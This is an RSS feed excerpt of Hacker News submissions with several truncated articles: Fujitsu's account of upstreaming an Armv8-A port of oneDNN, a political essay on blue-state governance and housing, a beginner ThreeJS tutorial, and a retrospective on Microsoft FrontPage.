<h2>Contribution of source code to the main branch of oneDNN</h2>

<p>I mentioned earlier that oneDNN source code has been released as OSS, but that is not all. It is being developed using an open development style that allows anyone to submit a pull request for source code they want to improve (request to incorporate improved source code into oneDNN). When a pull request has been submitted, the new source code is reviewed for bugs and tested to confirm that it improves the processing speed of oneDNN or helps to expand its functionality. If it passes both the review and test, it is incorporated into oneDNN. oneDNN is a software developed initially for CPUs with the x64 instruction set. The source code for our version of oneDNN, ported to and optimized for the Armv8-A instruction set, is available at <a href="https://github.com/fujitsu/oneDNN">https://github.com/fujitsu/oneDNN</a>. However, we thought that it would be beneficial for Fugaku users and many users in the world of CPUs that use the Armv8-A instruction set, if an implementation highly tuned for the main branch of oneDNN (the de facto DL process library) had been incorporated from the start. We therefore decided to work with Intel and actively submit a pull request to incorporate our changes into the main branch of oneDNN.</p>

<p>Incidentally, the improvements we made optimizing oneDNN for the Armv8-A instruction set were quite extensive, such as incorporating a required descriptor called Xbyak_aarch64 (explained later). For minor changes, all you need to do is modify the source code and submit a pull request. However, when submitting a pull request for large-scale changes to source code or for changes to APIs for parts related to the framework for oneDNN, you must first write a document called a Request For Comments (RFC) that describes what will be changed and summarizes the plan for doing so. Then, you must submit a pull request for the RFC itself for review and then merging. I put a lot of effort into writing the RFC knowing that this would benefit the many users of Fugaku and Armv8-A in the world. I treated this even more seriously than writing a research paper. It was a ton of work. But I finally did it. I submitted my RFC pull request. Before long, I received a question from an Intel developer on the RFC. I worked late into the night to make sure my answer was thorough. Then I went to sleep. And then I woke up. And then there was the next question. The Intel developer was located in the US, and because of the time difference the next question had been sent by the time I woke up. Not getting discouraged, I sent my response. Then I went to bed. And then I woke up. Next, the Intel developer had invited a developer from Arm to join in, since my RFP concerned an Arm product. It was now two-on-one battle. The Arm developer was located in the U.K. It was like we were playing volleyball and Arm and Intel had teamed for a spike fake-out. I could barely keep up. However, I were somehow able to answer all of their questions and they ultimately approved the RFC I had submitted. (Actually, they were really great people that treated me very kindly and asked purely technical questions. The fact that their questions came right after I responded due to the time difference actually meant that the process was going smoothly and shortened the time up to merging of the RFC.)</p>

<p>Once the RFC was merged, I next needed to submit a pull request for source code modified based on the RFC. I was able to keep up with the Ã¢â‚¬Å“spike fake-outsÃ¢â‚¬ï¿½ by Arm and Intel, and ultimately had the source code merged.
Having the source code (optimized for the Armv8-A instruction set) merged in an OSS project spearheaded by Intel caused quite a commotion in Fujitsu. It makes sense though. After all, from IntelÃ¢â‚¬â„¢s perspective this would help collaborating companies. Of course, the primary reason for this was that Intel opened the door on pull requests for other CPUs. So first of all, I would like to express my gratitude here for Intel. The secondary reason for this is that our source code was technically solid and that Intel recognized that it would help in developing DL process libraries. I do have to admit that I am a bit proud of this.</p>

<h2>Development of Xbyak_aarch64</h2>

<p>It is now time to discuss at some depth the technical aspects of porting and optimizing oneDNN for the Armv8-A instruction set. One of the key technologies in Intel's oneDNN is that it incorporates a JIT assembler called Xbyak (see the figure below).</p>

<figure title="Source code structure of oneDNN"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072153.png" alt="f:id:fltech:20201117072153p:plain" title="" itemprop="image"></span><figcaption>Source code structure of oneDNN</figcaption></figure>

<p>Xbyak is a software developed by Shigeo Mitsunari of Cybozu Labs and released as <a href="https://github.com/herumi/xbyak">OSS (https://github.com/herumi/xbyak)</a>. Xbyak offers the following features.</p>

<ol>
<li>Assembler programs can be written in C++</li>
<li>Executable â€¦</li></ol></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en">https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en</a></em></p>]]>
            </description>
            <link>https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155872</guid>
            <pubDate>Thu, 19 Nov 2020 23:55:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Make Blue America Great Again]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155793">thread link</a>) | @nutshell89
<br/>
November 19, 2020 | https://www.slowboring.com/p/make-blue-america-great-again | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/make-blue-america-great-again">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Happy Monday! </p><p>Iâ€™m very excited to get my first real week here at <code>Slow Boring</code> off the ground. But first I wanted to thank everyone who subscribed on Friday or over the weekend. The show of support is incredibly gratifying, and with your help I think we can make this thing work. Weâ€™re going to do four weeks of free content, after which most of the content will be for paying members only, so sign up now while introductory rates apply. </p><p>Iâ€™d also like to encourage members to participate in the comments sections and open threads. Iâ€™ve traditionally been very comments-averse myself, even while thinking that comments seem like a good idea in theory. But I realized that paid membership programs are the right way to make this work. Since the only people in the comments are the people who are sufficiently bought-in to pay money, youâ€™re not going to have drive-by trolling. Iâ€™ve been delving in and engaging, and I hope you will, too. </p><p>Now, on to the main event: I want to talk about the important question of what progressives do in politics in the places we govern.</p><h4>An upside to NIMBYism?</h4><p>Since people know Iâ€™m interested in the geographic bias of the political system and also in the consequences of housing scarcity in coastal cities, one question people sometimes ask me is whether NIMBYism is politically beneficial. The idea here is that housing scarcity in California drives people out of the state and into more conservative areas, which helps Democrats fight Senate skew.</p><p>I think this is probably wrong, factually speaking. California has whatâ€™s basically a state-level version of the Congressional Budget Office called the Legislative Analystâ€™s Office, and when they looked at <a href="https://lao.ca.gov/LAOEconTax/Article/Detail/265">net migration to and from California</a>, they found that â€œfamilies with kids and those with only a high school education predominate among those moving from California to its top destination states,â€ while â€œcollege-educated 18 to 35 year olds led the way among those moving to California.â€ That makes sense as itâ€™s working class families with kids who suffer most from housing scarcity. But that means itâ€™s probably disproportionately Republicans leaving, which is also what <a href="https://www.sacbee.com/news/local/sacramento-tipping-point/article246370775.html">most of the anecdotal reporting says</a>. By the same token, exit polls say <a href="https://www.dallasnews.com/news/politics/2018/11/09/native-texans-voted-for-native-texan-beto-o-rourke-transplants-went-for-ted-cruz-exit-poll-shows/">Beto Oâ€™Rourke won native-born Texans in 2018</a> while losing transplants. </p><p>But more fundamentally, I donâ€™t think finding ways to look on the bright side of bad policy choices is a good idea. </p><p>Fridayâ€™s post was mostly on the bummer theme of how, if progressives want to get anything done in federal politics, <a href="https://www.slowboring.com/p/welcome-to-slow-boring">we need to reconcile ourselves to trimming our sails quite a bit</a>. But the other side of the coin is that you need to reach for the impossible to some extent or youâ€™ll never achieve anything. Creating an actual statewide high-quality universal preschool program that delivered great results and made everyone happy, for example, would be a great way to build momentum nationally for such a program. </p><p>Itâ€™s in the blue states like California where the stuff progressives want to be doing with their energy â€” dreaming big, organizing, demanding stuff â€” could actually accomplish something. But itâ€™s going to take hard work and also, yes, some technocratic fussing. </p><h4>Social democracy in one Bay State</h4><p>My go-to example for this is Massachusetts, the state that pioneered both marriage equality and the Affordable Care Act, which became progressivesâ€™ two big national successes. </p><ul><li><p>At 6.9 million people, Massachusetts has a larger population than Finland or Denmark. </p></li><li><p>While some people say you canâ€™t create a state-level social democracy in the United States because of the lack of monetary sovereignty, Finland is part of the Eurozone and needs to follow EU fiscal rules, and Denmark has its currency pegged to the Euro. </p></li><li><p>Massachusetts has open borders with the rest of the United States, but Finland and Denmark have open borders with the EU. </p></li><li><p>In PPP-adjusted terms, Massachusettsâ€™ GDP per capita is a bit higher than oil-rich Norway and decidedly higher than Finland or Denmark.</p></li></ul><p>Long story short, Massachusetts has the material resources to make social democratsâ€™ dreams come true. And even though Elizabeth Warrenâ€™s election results there indicate pretty clearly that she pays an electoral penalty for being seen as an unusually left-wing Democrat, she still easily wins statewide elections â€” â€œhey, those ideas are unusually left-wing!â€ is not an obvious loser there. </p><p>If the way forward for <em>Democrats</em> is to reconcile themselves to the realities of the political map, the way forward for <em>progressives</em> is to try to put forward a vision thatâ€™s actually exciting and appealing to the unusually progressive electorate of places like Massachusetts, then implement it in those places in a way that makes progressive politics look successful and appealing to voters everywhere. </p><ul><li><p>You probably canâ€™t do â€œMedicare for Allâ€ in one state because of interactions with the federal Medicare program, but you could definitely do an ambitious public option with auto-enrollment thatâ€™s designed to gain market share over time.</p></li><li><p>You could definitely do free public college, or if thatâ€™s too expensive, you could do free community college. </p></li><li><p>All kinds of Green New Deal stuff about energy and transportation infrastructure is doable on the state level. </p></li><li><p>Child allowance and other strategies to reduce poverty are very doable on the state level, as are preschool and child care plans. </p></li><li><p>As David Madland points out, <a href="https://www.americanprogress.org/issues/economy/reports/2019/12/11/478539/guide-state-local-workers-boards/">state governments can even create wage boards</a> and move to a system of sectoral collective bargaining. </p></li></ul><p>State government is not a panacea or a long-term alternative to building national political power. But it is potentially a very effective way to make peopleâ€™s lives better. And more to the point, it is potentially a very effective way to build national political power by <em>showing people you have good ideas that work</em> and that you know what youâ€™re doing. </p><p>But a more ambitious version of state-level progressive governance would also have to confront the question of whether or not Blue Americaâ€™s political leaders <em>do</em>, in fact, know what theyâ€™re doing. </p><h4>Who is Blue America for?</h4><p>I grew up in Manhattan, went to Harvard, then moved to DC, so I am personally a pretty out-of-touch person. </p><p>But my broad sense is that most middle class Americans think of the big blue states, especially New York and California, as nice places to live for rich snobs, not as places that have really high quality public services. People who wouldnâ€™t want to live in Finland (itâ€™s too cold, too dark, bad food) could still concede that it would be nice to have all these free social benefits. But while taxes really are higher in blue America, itâ€™s not like San Francisco has the countryâ€™s best public schools or SUNY is the most impressive public university system. </p><p>Thatâ€™s not to say these are horrible places to live! But what you get in New York is access to a unique set of cultural amenities. California has cultural amenities, great weather, and access to the natural beauty that lurks right outside the major cities. To gain access to those amenities you need to deal with  high housing costs. So if youâ€™re rich and enjoy that stuff, you can have a nice house in Brooklyn. Alternatively, if youâ€™re rich and live someplace cheaper, you can have a giant mansion, a couple of fancy cars, and a boat. If youâ€™re <em>young,</em> you can have dismal accommodations in a big liberal city but have fun going out and meeting people. But a middle class couple with a generic job and a couple of kids isnâ€™t setting out to blue America for the higher material living standards.  </p><p>Thatâ€™s because there are huge regional differences in the cost of living in the United States, they disfavor the blue coastal areas, and theyâ€™re driven by housing costs.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/3cf76768-a235-452f-ac23-b63cfb81b41f_602x525.png&quot;,&quot;height&quot;:525,&quot;width&quot;:602,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:223939,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If youâ€™ve read anything that Iâ€™ve written ever, you know <a href="https://www.amazon.com/Rent-Too-Damn-High-Matters-ebook/dp/B0078XGJXO">the reason is land use regulations</a>. Reforming those policies is critical to making blue states great places to live, places that people associate with prosperity and policy success rather than eccentric lifestyle preferences. </p><p>And while public housing, affordable housing set-asides, and other forms of non-market or â€œsocialâ€ housing can be a piece of the puzzle, market-rate housing is essential. </p><p>One reason itâ€™s essential is that a well-governed, great place to live should be accessible to middle class people, not an upstairs/downstairs economy of rich people and the subsidy-dependent. But another reason is that robust market-rate housebuilding grows the economy and the tax base and at least makes it conceivable that youâ€™re going to provide first-rate public services instead of just paying off old pension debt. And growing the tax base matters. Itâ€™s not true that you canâ€™t build a robust welfare state in a governance unit that needs to balance its budget. But it <em>is</em> true that in state and local politics you are playing with real money. Cash spent on the library canâ€™t go to the parks. Cash spent on the bus means higher taxes. To be popular and effective you need to deliver value, especially if youâ€™re not sitting on a geyser of tech IPOs throwing off tax revenue.</p><h4>Subway socialism </h4><p>Over the past few years Iâ€™ve gotten really interested in the so-called <a href="https://www.thenation.com/article/archive/last-sewer-socialists/">â€œsewer socialistsâ€ of Milwaukee</a>.</p><p>In the early 20th century there was a big base of German immigrants in the Milwaukee area to whom socialism was not a scary foreign concept, so socialists were able to win elections and control municipal government. In office, they built one of the first municipal public works departments, and they were proud of the DPWâ€™s accomplishments. Other socialists from elsewhere around the country were, as socialists in America typically are, left-wing intellectuals detached from practical governance. And they made fun of these Milwaukee guys for constantly talking about their public works rather than overthrowing capitalism. </p><p>But what the Milwaukee guys got was that if you want non-market provision of stuff, there comes a time when <em>you actually need to go do the stuff</em>.  You can say that <a href="https://www.huffpost.com/entry/vienna-affordable-housing-paradise_n_5b4e0b12e4b0b15aba88c7b0">Vienna proves excellent public housing is â€¦</a></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/make-blue-america-great-again">https://www.slowboring.com/p/make-blue-america-great-again</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/make-blue-america-great-again</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155793</guid>
            <pubDate>Thu, 19 Nov 2020 23:45:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understand 3D in JavaScript (ThreeJS) in 5 minutes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155776">thread link</a>) | @jesuisundev
<br/>
November 19, 2020 | https://www.jesuisundev.com/en/understand-threejs/ | <a href="https://web.archive.org/web/*/https://www.jesuisundev.com/en/understand-threejs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			
<!-- Horizontal Top Article -->
<p>With a little knowledge in Javascript, you can do incredible things in 3D with ThreeJS. Itâ€™s much simpler than it looks and itâ€™s so much fun. The only problem is the first learning barrier. Today, Iâ€™m taking that barrier down for you in 5 minutes. After that, all youâ€™ll have to do is have fun.</p>



<h3>What is ThreeJS?</h3>



<p>ThreeJS is a library in Javascript, created by <a href="https://twitter.com/mrdoob" target="_blank" rel="noreferrer noopener">Mr.doob</a>, that allows you to manipulate 3D objects directly in the browser. What you have to understand is that ThreeJS, <strong>via Javascript</strong>, allows you to use <a href="https://en.wikipedia.org/wiki/WebGL" target="_blank" rel="noreferrer noopener">WebGL</a> in an <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial" target="_blank" rel="noreferrer noopener">HTML5 canvas</a>.</p>



<p><strong>WebGL</strong> is a <strong>Javascript API</strong> that allows you to create 2D and 3D graphic rendering.<br>A <strong>canvas </strong>is an <strong>HTML component</strong> that is part of the HTML5 specification and allows to display graphic rendering.</p>



<p>ThreeJS, via Javascript, allows you to drive WebGL, and thus 3D. <strong>And the crazy part is that there is no additional installation and/or plugin needed !</strong> Import the the library and voila, the 3D world is opening.</p>



<figure><img src="https://i.imgur.com/voS76PB.jpg" data-src="https://i.imgur.com/voS76PB.jpg" alt=""></figure>



<p>So in summary, we have a <strong>Javascript library<strong>(ThreeJS)</strong></strong> that manipulates a <strong>Javascript API to do graphical rendering</strong> (WebGL) in an <strong>HTML5 component</strong>. Easy!</p>



<p>Now youâ€™re going to tell me, why are we using ThreeJS? If itâ€™s actually WebGL, why not write WebGL directly ?  The answer is pretty simple. </p>



<p>ThreeJS simplifies and shortens to the extreme the code needed to do whatever you want. <strong>ThreeJS does all the complex part for you.</strong> You just have to do simple Javascript on your side.</p>



<p>So if you have simple Javascript knowledge, ThreeJS gives you the power to do incredible things in 3D.</p>



<p>But concretely, how does it work?</p>



<h3>How does it work?</h3>



<p>To understand how ThreeJS works at a high level you need to put yourself in the shoes of a film director. Yes, poof, Iâ€™ve just decided, <strong>youâ€™re a movie director now</strong>.</p>



<p>And to shoot your movie in Javascript, youâ€™re going to need to create and manipulate several key elements.</p>



<ul><li><strong>The scene</strong></li></ul>



<p><strong>You can see the scene like the 3D world youâ€™re going to work in.</strong> Youâ€™re going to arrange objects in this scene. Youâ€™re going to create as many objects as you want in your scene via the meshes.</p>



<hr>



<ul><li><strong>The meshes</strong></li></ul>



<p>Meshes are simply the objects that will be present in your scene. You will need to put light on these objects to see them. To see them, you will have to film them. To film them, you need a camera.</p>



<hr>



<ul><li><strong>The camera</strong></li></ul>



<p>As in real life, the camera will show a point of view of your scene. <strong>Weâ€™re going to talk about field of view (fov), to be precise.</strong> By moving the camera, youâ€™re going to move objects in or out of this field of view. Itâ€™s what you see in this field of view of this camera that will be sent to the rendering engine.</p>



<hr>



<ul><li><strong>Rendering engine</strong></li></ul>



<p>The rendering engine takes the scene and the camera as parameters. <strong>With that, it displays everything in the HTML5 canvas I was telling you about at the beginning.</strong> The rendering engine will produce an image each time your screen is refreshed. In general, 60 frames per second. Thatâ€™s what gives life to your animation!</p>



<p>I guess it can still be pretty abstract at the moment. I have to draw you a picture to make it more concrete. Ok, Iâ€™ll use my drawing skills then.</p>



<div><figure><img src="https://i.imgur.com/f7FVxpB.jpg" data-src="https://i.imgur.com/f7FVxpB.jpg" alt=""></figure></div>



<p>Can you tell iâ€™m backend developer ?</p>



<p>Anyway, it should be much clearer now between the explanations and the drawing. But weâ€™re getting to know each other, I know you want to see code now.</p>



<h3>Show the code</h3>



<p>As the Hello World app weâ€™ll make it as simple as possible. Weâ€™re going to code the schema I made for you just before.</p>



<p>A basic scene with a cube in the middle. Except that instead of the cube, weâ€™re going to put a cylinder, just because I feel like it. <strong>Weâ€™re going to make it spin on itself and weâ€™re going to put it in the cameraâ€™s field of view.</strong></p>



<p>Iâ€™m going to comment strongly on each line so that you understand everything thatâ€™s going on. I will also frequently talk about <a href="https://threejs.org/docs/index.html#manual/en/introduction/Creating-a-scene" target="_blank" rel="noreferrer noopener">the official documentation</a>, so donâ€™t hesitate to read it as you go along.</p>



<figure><img src="https://i.redd.it/57vwxbnx22w01.jpg" data-src="https://i.redd.it/57vwxbnx22w01.jpg" alt=""></figure>



<p>We start by <strong>declaring our scene</strong>, without that, nothing is visible! Then <strong>the rendering engine</strong> for our scene. Without this, no image will be created and displayed to the user. Then we want <strong>a camera</strong> to film the scene. Here we will use a perspective camera. The options allow us to configure the field of view.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const scene = new THREE.Scene()
const renderer = new THREE.WebGLRenderer()
const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000)</pre>



<p>We already have everything we need to show things now. Letâ€™s create the cylinder via a <a href="https://threejs.org/docs/#api/en/objects/Mesh" target="_blank" rel="noreferrer noopener">mesh</a>! To create a mesh we need two things.</p>



<p><strong>The geometric shape that the object will have</strong>. Here we want a cylinder so <strong><a href="https://threejs.org/docs/#api/en/geometries/CylinderGeometry" target="_blank" rel="noreferrer noopener">CylinderGeometry</a></strong> is perfect for our needs.</p>



<p><strong>The material of this object.</strong> The material is the digital version of real world materials. The materials control the color of the object and the degree of reflection of the surface. <strong>Here we put a basic material of red color.</strong></p>



<p>With these two parts we can create our object, add it to the scene and place the camera over it.</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const geometry = new THREE.CylinderGeometry(5, 5, 20, 32)
const material = new THREE.MeshBasicMaterial({ color: 0xff0000, wireframe: true })
const cylinder = new THREE.Mesh(geometry, material)

scene.add(cylinder)
camera.position.z = 20</pre>



<p>Then, weâ€™re going to put the rendering engine in full screen and add it in the HTML page via the HTML5 canvas!</p>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">renderer.setSize(window.innerWidth, window.innerHeight)
document.body.appendChild(renderer.domElement)</pre>



<p>Finally, weâ€™re going to animate things up. <strong>We are going to create an animation function that will be called in an infinite loop.</strong> Each time we go through this function weâ€™re going to:</p>



<ul><li>make the cylinder rotate on itself</li><li>ask the rendering engine to create and display an image</li><li>recall this same animation function</li></ul>



<pre data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function animate() {
    cylinder.rotation.x += 0.01
    cylinder.rotation.y += 0.01

    renderer.render(scene, camera)

    requestAnimationFrame(animate)
}

animate()</pre>



<p>And thatâ€™s it ! Done ! I put everything in a codepen and let you play with it now.</p>







<p>I tried to make this article a highway for understanding Javascript 3D. I sincerely think that after this first barrier of understanding, you can quickly do incredible things! Go use you new power now.</p>



<figure><img src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" data-src="https://i.pinimg.com/originals/ae/41/8b/ae418ba64065b2875f8970dd42756633.jpg" alt=""></figure>



<p>A few weeks ago, I hadnâ€™t touched 3D in any way, shape or form. Starting from the basic example I just presented to you, in a few days,<strong> I created a 3D web experience that takes you through the universe in your browser</strong>.</p>







<p>Iâ€™m really super proud of it and I invite you to <a href="https://www.jesuisundev.com/en/across-the-universe/" target="_blank" rel="noreferrer noopener">take a look at it</a>. Thereâ€™s a story, music and itâ€™s amazing. <strong><a href="https://across-universe.com/" target="_blank" rel="noreferrer noopener">A real show!</a></strong> If youâ€™re even more curious, you have all <strong><a href="https://github.com/jesuisundev/acrosstheuniverse" target="_blank" rel="noreferrer noopener">the source code on my GitHub</a></strong>.</p>



<h3>Epilogue</h3>



<p>If I can do this kind of thing in a week, thatâ€™s proof that anyone can do it. Anything you can imagine as animation is within your reach with your knowledge of Javascript. And now that you have the ThreeJS base, itâ€™s up to you to see if the adventure tempts you.</p>

			<!-- clearfix -->
			

			
		</div></div>]]>
            </description>
            <link>https://www.jesuisundev.com/en/understand-threejs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25155776</guid>
            <pubDate>Thu, 19 Nov 2020 23:43:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft FrontPage: the good, the bad, the ugly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155442">thread link</a>) | @fanf2
<br/>
November 19, 2020 | https://invisibleup.com//articles/33/ | <a href="https://web.archive.org/web/*/https://invisibleup.com//articles/33/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	
	
	<img src="https://invisibleup.com/articles/33/thumb.png" alt="FrontPage: The Good, The Bad, and The Ugly thumbnail">
	
	

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
